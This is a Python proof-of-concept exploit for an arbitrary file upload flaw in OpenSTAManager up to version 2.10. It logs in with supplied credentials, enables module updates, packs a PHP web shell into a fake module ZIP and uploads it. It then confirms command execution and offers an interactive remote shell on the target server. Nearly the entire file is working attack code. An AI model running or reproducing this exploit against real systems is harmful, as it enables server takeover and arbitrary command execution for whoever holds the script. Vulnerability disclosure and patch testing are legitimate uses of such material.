#!/usr/bin/env python3
"""
OpenSTAManager RCE POC
Version: <= 2.10
Vulnerability: Arbitrary File Upload leading to RCE
CVE-2026-38751
Author: god.boil
Email: god.boil@outlook.com

Usage:
    python poc.py -u http://target:8080 -U admin -P password
    python poc.py -u http://target:8080 -U admin -P password -i  # Interactive mode
"""

import argparse
import zipfile
import requests
import re
import time
from urllib.parse import urljoin


class OpenSTAManagerExploit:
    def __init__(self, target_url, username, password):
        self.target = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.shell_url = None
        
    def login(self):
        """Login to the system"""
        login_url = urljoin(self.target, '/index.php')
        
        try:
            self.session.get(login_url, timeout=10)
            r = self.session.post(login_url + '?op=login', data={
                'username': self.username,
                'password': self.password
            }, allow_redirects=True, timeout=10)
            
            # Check if redirected back to login page (login failed)
            if r.url.rstrip('/') == login_url.rstrip('/') or 'op=login' in r.url:
                # Further check for error messages
                if 'Credenziali non valide' in r.text or 'Username o password errati' in r.text:
                    print("[-] Login failed: Invalid credentials")
                    return False
                print("[-] Login failed: Authentication invalid")
                return False
            
            # Check if can access authenticated pages
            test_url = urljoin(self.target, '/controller.php?id_module=1')
            test_r = self.session.get(test_url, timeout=10)
            
            # If redirected to login page, session is invalid
            if 'index.php' in test_r.url and 'id_module' not in test_r.url:
                print("[-] Login failed: Invalid session")
                return False
            
            if test_r.status_code == 200:
                print(f"[+] Login successful: {self.username}")
                return True
                
        except Exception as e:
            print(f"[-] Login error: {e}")
            
        print("[-] Login failed: Unknown error")
        return False
    
    def enable_updates(self):
        """Enable update functionality"""
        settings_url = urljoin(self.target, '/ajax.php?a=check_module_updates_settings')
        
        try:
            self.session.post(settings_url, data={'Attiva aggiornamenti': '1'}, timeout=10)
            print("[+] Updates enabled")
            return True
        except Exception as e:
            print(f"[*] Enable updates: {e}")
            return True
    
    def create_zip(self):
        """Create malicious ZIP file (using MODULE file, module update flow)"""
        zip_path = 'poc.zip'
        
        # MODULE file content - specify module info
        module_content = '''name = "shell"
directory = "shell"
version = "1.0"
compatibility = "2.10"
options = ""
icon = "fa fa-bug"
parent = "Dashboard"
'''
        
        # WebShell content
        shell_content = '<?php if(isset($_GET["c"])){echo "<pre>";system($_GET["c"]);echo "</pre>";} ?>'
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Include MODULE file, use module update flow
            # Files will be copied to modules/shell/ directory
            zf.writestr('shell/MODULE', module_content)
            zf.writestr('shell/shell.php', shell_content)
            
        print(f"[*] Created: {zip_path}")
        print(f"[*] Shell location: /modules/shell/shell.php")
        return zip_path
    
    def upload(self, zip_file):
        """Upload ZIP file"""
        upload_url = urljoin(self.target, '/modules/aggiornamenti/upload_modules.php')
        
        with open(zip_file, 'rb') as f:
            files = {'blob': ('update.zip', f, 'application/zip')}
            try:
                r = self.session.post(upload_url, files=files, timeout=30)
                print(f"[*] Upload status: {r.status_code}")
                # Even if returns 500, file may be uploaded successfully
                return r.status_code in [200, 302, 500]
            except Exception as e:
                print(f"[-] Upload error: {e}")
                return False
    
    def verify(self):
        """Verify vulnerability"""
        # shell is uploaded to modules/shell/shell.php
        self.shell_url = urljoin(self.target, '/modules/shell/shell.php')
        
        try:
            # Wait for file to be written
            time.sleep(1)
            
            r = self.session.get(self.shell_url, params={'c': 'id'}, timeout=10)
            if r.status_code == 200 and ('uid=' in r.text or 'www-data' in r.text or 'root' in r.text):
                print(f"[+] Vulnerability confirmed!")
                print(f"[+] Shell: {self.shell_url}")
                print(f"[+] Test: {self.shell_url}?c=whoami")
                return True
        except Exception as e:
            print(f"[-] Verify error: {e}")
            
        return False
    
    def execute(self, cmd):
        """Execute command"""
        if not self.shell_url:
            return None
            
        try:
            r = self.session.get(self.shell_url, params={'c': cmd}, timeout=10)
            if r.status_code == 200:
                # Extract command output
                text = re.sub(r'<pre>|</pre>', '', r.text)
                return text.strip()
        except Exception as e:
            print(f"[-] Execute error: {e}")
            
        return None
    
    def cleanup(self):
        """Cleanup uploaded WebShell"""
        if not self.shell_url:
            return False
            
        try:
            # Use rm command to delete shell
            self.execute('rm /var/www/html/modules/shell/shell.php')
            print(f"[+] Cleaned up: shell.php")
            return True
        except Exception as e:
            print(f"[-] Cleanup error: {e}")
            return False
    
    def interactive_shell(self):
        """Interactive command execution"""
        if not self.shell_url:
            print("[-] Shell not available")
            return
            
        print(f"[*] Interactive shell: {self.shell_url}")
        print("[*] Type 'exit' to quit, 'cleanup' to remove shell and exit")
        
        while True:
            try:
                cmd = input("cmd> ").strip()
                if not cmd:
                    continue
                if cmd.lower() == 'exit':
                    break
                if cmd.lower() == 'cleanup':
                    self.cleanup()
                    break
                    
                output = self.execute(cmd)
                if output:
                    print(output)
                else:
                    print("[-] Command execution failed")
            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def exploit(self, interactive=False, no_cleanup=False):
        print("=" * 50)
        print("OpenSTAManager RCE Exploit")
        print("=" * 50)
        print(f"Target: {self.target}")
        
        print("[*] Step 1: Login...")
        if not self.login():
            return False
        
        print("[*] Step 2: Enable updates...")
        self.enable_updates()
        
        print("[*] Step 3: Create ZIP...")
        zip_file = self.create_zip()
        
        print("[*] Step 4: Upload...")
        if not self.upload(zip_file):
            print("[-] Upload failed")
            return False
            
        print("[+] Upload successful")
        
        print("[*] Step 5: Verify...")
        if not self.verify():
            print("[-] Verification failed")
            return False
            
        if interactive:
            print("[*] Entering interactive mode...")
            self.interactive_shell()
        elif not no_cleanup:
            # Execute test commands
            print("\n[*] Test commands:")
            print(f"    whoami: {self.execute('whoami')}")
            print(f"    pwd: {self.execute('pwd')}")
            print(f"\n[*] Cleaning up shell...")
            self.cleanup()
        else:
            print(f"\n[+] Shell: {self.shell_url}")
            print(f"[+] Usage: {self.shell_url}?c=whoami")
            
        return True


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='OpenSTAManager RCE Exploit - Arbitrary File Upload'
    )
    parser.add_argument('--url', '-u', required=True, help='Target URL')
    parser.add_argument('--user', '-U', required=True, help='Username')
    parser.add_argument('--password', '-P', required=True, help='Password')
    parser.add_argument('--interactive', '-i', action='store_true', help='Interactive mode')
    parser.add_argument('--no-cleanup', action='store_true', help='Do not cleanup shell')
    
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════════════════╗
    ║   OpenSTAManager RCE Exploit                  ║
    ║   Arbitrary File Upload leading to RCE        ║
    ╚═══════════════════════════════════════════════╝
    """)
    
    exp = OpenSTAManagerExploit(args.url, args.user, args.password)
    exp.exploit(interactive=args.interactive, no_cleanup=args.no_cleanup)
